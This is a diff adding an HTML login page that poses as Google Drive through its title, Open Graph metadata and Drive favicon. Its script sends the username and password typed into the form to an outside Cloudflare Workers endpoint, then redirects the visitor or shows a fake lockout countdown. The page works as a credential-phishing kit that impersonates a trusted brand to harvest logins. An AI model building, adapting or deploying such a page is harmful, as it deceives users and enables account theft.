@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0" />
+<title>Home - Google Drive</title>
+<meta property="og:locale" content="en-US" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Home - Google Drive" />
+<link rel="icon" href="https://ssl.gstatic.com/docs/doclist/images/drive_favicon_2026_32dp.png" />
+  <style>
+    :root {
+      --bg-color: #0f172a;
+      --card-bg: #1e293b;
+      --text-main: #f8fafc;
+      --text-muted: #94a3b8;
+      --accent-color: #3b82f6;
+      --accent-hover: #2563eb;
+      --error-color: #ef4444;
+      --border-color: #334155;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+
+    body {
+      background-color: var(--bg-color);
+      color: var(--text-main);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 1rem;
+    }
+
+    .login-container {
+      background-color: var(--card-bg);
+      border: 1px solid var(--border-color);
+      border-radius: 12px;
+      padding: 2.5rem 2rem;
+      width: 100%;
+      max-width: 380px;
+      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5);
+    }
+
+    .login-header { text-align: center; margin-bottom: 1.5rem; }
+    .login-header h1 { font-size: 1.5rem; font-weight: 600; margin-bottom: 0.5rem; }
+    .login-header p { color: var(--text-muted); font-size: 0.875rem; }
+
+    .form-group { margin-bottom: 1.25rem; }
+    .form-group label { display: block; font-size: 0.875rem; margin-bottom: 0.5rem; color: var(--text-muted); }
+    .form-group input {
+      width: 100%;
+      padding: 0.75rem 1rem;
+      background-color: var(--bg-color);
+      border: 1px solid var(--border-color);
+      border-radius: 6px;
+      color: var(--text-main);
+      font-size: 0.95rem;
+      outline: none;
+    }
+
+    .btn-submit {
+      width: 100%;
+      padding: 0.75rem;
+      background-color: var(--accent-color);
+      color: #ffffff;
+      border: none;
+      border-radius: 6px;
+      font-size: 0.95rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.2s ease, opacity 0.2s ease;
+    }
+
+    .btn-submit:disabled, .form-group input:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    .error-box {
+      background-color: rgba(239, 68, 68, 0.1);
+      border: 1px solid var(--error-color);
+      color: var(--error-color);
+      padding: 0.75rem;
+      border-radius: 6px;
+      font-size: 0.85rem;
+      margin-bottom: 1.25rem;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <div class="login-header">
+      <h1>Login</h1>
+      <p>Please enter your credentials to continue</p>
+    </div>
+
+    <div id="error-box" class="error-box" style="display: none;"></div>
+
+    <form id="login-form">
+      <div class="form-group">
+        <label for="username">Username</label>
+        <input type="text" id="username" name="username" required autocomplete="username" />
+      </div>
+
+      <div class="form-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" required autocomplete="current-password" />
+      </div>
+
+      <button type="submit" id="submit-btn" class="btn-submit">Sign In</button>
+    </form>
+  </div>
+
+  <script>
+    const WORKER_URL = "https://my-auth-worker.acomputerman.workers.dev";
+
+    const form = document.getElementById('login-form');
+    const submitBtn = document.getElementById('submit-btn');
+    const inputs = document.querySelectorAll('input');
+    const errorBox = document.getElementById('error-box');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      
+      submitBtn.disabled = true;
+      submitBtn.innerText = "Verifying...";
+      errorBox.style.display = 'none';
+
+      const formData = new FormData(form);
+
+      try {
+        const response = await fetch(`${WORKER_URL}/login`, {
+          method: 'POST',
+          body: formData,
+          credentials: 'omit'
+        });
+
+        if (response.ok) {
+          const data = await response.json();
+          window.location.href = data.redirectUrl;
+        } else {
+          startLockout(10);
+        }
+      } catch (err) {
+        startLockout(10);
+      }
+    });
+
+    function startLockout(seconds) {
+      errorBox.style.display = 'block';
+      inputs.forEach(input => input.disabled = true);
+      submitBtn.disabled = true;
+
+      let remaining = seconds;
+      const interval = setInterval(() => {
+        if (remaining <= 0) {
+          clearInterval(interval);
+          errorBox.innerText = "Invalid credentials. Try again.";
+          submitBtn.innerText = "Sign In";
+          submitBtn.disabled = false;
+          inputs.forEach(input => input.disabled = false);
+        } else {
+          errorBox.innerText = `Invalid credentials. Retrying in ${remaining}s...`;
+          submitBtn.innerText = `Locked (${remaining}s)`;
+          remaining--;
+        }
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
